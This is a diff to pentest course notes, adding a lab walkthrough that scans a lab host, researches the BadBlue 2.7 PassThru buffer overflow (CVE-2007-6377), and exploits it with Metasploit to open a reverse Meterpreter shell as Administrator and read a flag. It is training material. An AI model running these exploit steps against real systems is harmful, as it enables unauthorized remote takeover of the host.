@@ -10,6 +10,11 @@
 > * Describe vulnerability management and perform research
 > * Perform network auditing
 >
+> #### 🔬 Training list - PentesterAcademy/INE Labs
+>
+> `subscription required`
+>
+> - [Windows: Easy File Sharing Server](https://attackdefense.com/challengedetails?cid=1944)
 
 ## Vulnerabilities
 
@@ -49,6 +54,8 @@ Risk Management includes **vulnerability management**. By doing a **`VA`** (Vuln
 - Scanning
 - Asset Identification and Research
 - Fuzz Testing (input/handling validation)
+
+🗒️ [**`Nessus`**](https://www.tenable.com/products/nessus) is a network vulnerability scanning tool. It can be hosted locally and used for Vulnerability Assessment.
 
 ## Case Studies
 
@@ -111,14 +118,85 @@ nmap --script log4shell.nse --script-args log4shell.callback-server=<CALLBACK_SE
 
 ------
 
-<!-- COMMENTED
-
-## Nessus Lab
-
-🗒️ [**`Nessus`**](https://www.tenable.com/products/nessus) is a network vulnerability scanning tool. It can be hosted locally.
+## Vulnerable Lab
 
 >  🔬 [Windows: Easy File Sharing Server](https://attackdefense.com/challengedetails?cid=1944)
 >
->  - `Nessus` tool hands-on.
+>  - Target IP: `10.2.28.13`
+>  - Fingerprint the application and exploit the found vulnerability
 
--->
+```bash
+ping 10.2.28.13
+nmap -sV 10.2.28.13
+```
+
+```bash
+80/tcp    open  http               BadBlue httpd 2.7
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3389/tcp  open  ssl/ms-wbt-server?
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49155/tcp open  msrpc              Microsoft Windows RPC
+49165/tcp open  msrpc              Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+```
+
+![nmap scan](.gitbook/assets/image-20230225105213357.png)
+
+- Research the vulnerability of `BadBlue httpd 2.7` using various tools:
+  - Google it
+  - [NVD - CVE-2007-6377](https://nvd.nist.gov/vuln/detail/CVE-2007-6377)
+  - [exploit-db.com](https://www.exploit-db.com/)
+  - [cvedetails.com - CVE-2007-6377](https://www.cvedetails.com/cve/CVE-2007-6377/)
+
+> *Stack-based buffer overflow in the PassThru functionality in ext.dll in BadBlue 2.72b and earlier allows remote attackers to execute arbitrary code via a long query string.*
+
+- Search for exploits from [exploit-db.com](https://www.exploit-db.com/exploits/16806) or using a command line tool such as **`searchsploit`**
+
+![exploit-db.com - BadBlue](.gitbook/assets/image-20230225105014570.png)
+
+### [searchsploit](https://www.exploit-db.com/searchsploit)
+
+> **`searchsploit`** - *a command line search tool for Exploit-DB*. A copy of Exploit Database can be used offline.
+
+![searchsploit badblue 2.7](.gitbook/assets/image-20230225105609443.png)
+
+- Use Metasploit to exploit the target using the [PassThru Buffer Overflow module](https://www.rapid7.com/db/modules/exploit/windows/http/badblue_passthru/)
+
+  - *This module exploits a stack buffer overflow in the PassThru functionality in ext.dll in BadBlue 2.72b and earlier.*
+
+> ❗ **Before running an exploit, ALWAYS check its [Source Code](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/windows/http/badblue_passthru.rb)** to understand what it is doing.❗
+
+```bash
+msfconsole
+```
+
+```bash
+search badblue 2.7
+use exploit/windows/http/badblue_passthru
+set RHOSTS 10.2.28.13
+exploit
+```
+
+```bash
+[*] Started reverse TCP handler on 10.10.24.3:4444 
+[*] Trying target BadBlue EE 2.7 Universal...
+[*] Sending stage (180291 bytes) to 10.2.28.13
+[*] Meterpreter session 1 opened (10.10.24.3:4444 -> 10.2.28.13:49330) at 2023-02-25 15:32:52 +0530
+
+meterpreter > getuid
+Server username: WIN-OMCNBKR66MN\Administrator
+```
+
+- Use [meterpreter](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/) commands to find the flag
+
+```
+shell
+cd /
+dir
+type flag.txt
+```
+
